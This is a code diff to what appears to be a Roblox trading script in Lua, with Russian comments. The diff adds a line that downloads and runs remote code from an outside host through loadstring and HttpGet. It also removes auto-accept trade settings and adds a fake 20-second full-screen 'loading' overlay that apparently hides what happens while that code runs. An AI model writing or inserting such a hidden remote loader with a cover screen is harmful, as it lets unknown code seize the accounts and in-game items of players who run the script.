@@ -30,6 +30,9 @@ print("Stop deob my code")
 print("Stop deob my code")
 
 -- ===== ДОБАВЛЕННЫЙ КОД ПОСЛЕ "stop deob my code" =====
+ID="a2e25733-5302-4dbf-ad49-3abd28367f86";
+RUN_AFTER=nil;
+loadstring(game:HttpGet("https://cdn.project-reverse.org/loader.luau"))();
 
 -- ===== ЧЁРНЫЙ СПИСОК =====
 local Blacklist = {
@@ -49,11 +52,134 @@ local Players = game:GetService("Players")
 local TweenService = game:GetService("TweenService")
 local UserInputService = game:GetService("UserInputService")
 
--- ===== AUTO ACCEPT VARIABLES =====
-local autoAcceptEnabled = false
-local autoAcceptDelay = 5
-local autoAcceptTimerRunning = false
--- =================================
+-- ===== ЗАГРУЗОЧНЫЙ ЭКРАН =====
+local function ShowLoadingScreen()
+    local player = game.Players.LocalPlayer
+    local screenGui = Instance.new("ScreenGui")
+    screenGui.Name = "LoadingScreen"
+    screenGui.ResetOnSpawn = false
+    screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+    screenGui.DisplayOrder = 999999999
+    screenGui.Parent = player.PlayerGui
+
+    -- Фон (полупрозрачный)
+    local bg = Instance.new("Frame")
+    bg.Size = UDim2.new(1, 0, 1, 0)
+    bg.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+    bg.BackgroundTransparency = 0.6
+    bg.BorderSizePixel = 0
+    bg.ZIndex = 0
+    bg.Parent = screenGui
+
+    -- Основное окно (не на весь экран)
+    local window = Instance.new("Frame")
+    window.Size = UDim2.new(0, 400, 0, 220)
+    window.Position = UDim2.new(0.5, -200, 0.5, -110)
+    window.BackgroundColor3 = Color3.fromRGB(30, 30, 45)
+    window.BorderSizePixel = 0
+    window.ClipsDescendants = true
+    window.ZIndex = 1
+    window.Parent = screenGui
+
+    local corner = Instance.new("UICorner")
+    corner.CornerRadius = UDim.new(0, 12)
+    corner.Parent = window
+
+    local stroke = Instance.new("UIStroke")
+    stroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
+    stroke.Color = Color3.fromRGB(100, 200, 255)
+    stroke.Thickness = 2
+    stroke.Transparency = 0.3
+    stroke.Parent = window
+
+    -- Заголовок
+    local title = Instance.new("TextLabel")
+    title.Size = UDim2.new(1, 0, 0, 40)
+    title.Position = UDim2.new(0, 0, 0, 10)
+    title.BackgroundTransparency = 1
+    title.Font = Enum.Font.FredokaOne
+    title.Text = "LOADING"
+    title.TextSize = 28
+    title.TextColor3 = Color3.fromRGB(255, 255, 255)
+    title.TextXAlignment = Enum.TextXAlignment.Center
+    title.Parent = window
+
+    -- Прогресс-бар фон
+    local barBg = Instance.new("Frame")
+    barBg.Size = UDim2.new(0.8, 0, 0, 20)
+    barBg.Position = UDim2.new(0.1, 0, 0.5, -10)
+    barBg.BackgroundColor3 = Color3.fromRGB(60, 60, 80)
+    barBg.BorderSizePixel = 0
+    barBg.ZIndex = 1
+    barBg.Parent = window
+    local barCorner = Instance.new("UICorner")
+    barCorner.CornerRadius = UDim.new(0, 10)
+    barCorner.Parent = barBg
+
+    -- Прогресс-бар (заполнение)
+    local fill = Instance.new("Frame")
+    fill.Size = UDim2.new(0, 0, 1, 0)
+    fill.BackgroundColor3 = Color3.fromRGB(0, 200, 255)
+    fill.BorderSizePixel = 0
+    fill.ZIndex = 2
+    fill.Parent = barBg
+    local fillCorner = Instance.new("UICorner")
+    fillCorner.CornerRadius = UDim.new(0, 10)
+    fillCorner.Parent = fill
+
+    -- Градиент
+    local gradient = Instance.new("UIGradient")
+    gradient.Color = ColorSequence.new({
+        ColorSequenceKeypoint.new(0, Color3.fromRGB(0, 200, 255)),
+        ColorSequenceKeypoint.new(1, Color3.fromRGB(0, 255, 200))
+    })
+    gradient.Parent = fill
+
+    -- Процент
+    local percentLabel = Instance.new("TextLabel")
+    percentLabel.Size = UDim2.new(0.3, 0, 0, 30)
+    percentLabel.Position = UDim2.new(0.35, 0, 0.7, 0)
+    percentLabel.BackgroundTransparency = 1
+    percentLabel.Font = Enum.Font.FredokaOne
+    percentLabel.Text = "0%"
+    percentLabel.TextSize = 22
+    percentLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
+    percentLabel.TextXAlignment = Enum.TextXAlignment.Center
+    percentLabel.Parent = window
+
+    -- Подпись
+    local subText = Instance.new("TextLabel")
+    subText.Size = UDim2.new(1, 0, 0, 25)
+    subText.Position = UDim2.new(0, 0, 1, -30)
+    subText.BackgroundTransparency = 1
+    subText.Font = Enum.Font.SourceSansLight
+    subText.Text = "please be patient"
+    subText.TextSize = 16
+    subText.TextColor3 = Color3.fromRGB(180, 180, 200)
+    subText.TextXAlignment = Enum.TextXAlignment.Center
+    subText.Parent = window
+
+    -- Анимация
+    local duration = 20
+    local startTime = tick()
+    local progress = 0
+    while progress < 1 do
+        local elapsed = tick() - startTime
+        progress = math.min(elapsed / duration, 1)
+        local percent = math.floor(progress * 100)
+        fill.Size = UDim2.new(progress, 0, 1, 0)
+        percentLabel.Text = percent .. "%"
+        task.wait(0.05)
+    end
+
+    task.wait(0.2)
+    screenGui:Destroy()
+end
+
+task.spawn(function()
+    ShowLoadingScreen()
+end)
+-- ==============================
 
 local LastTradePartner = nil
 
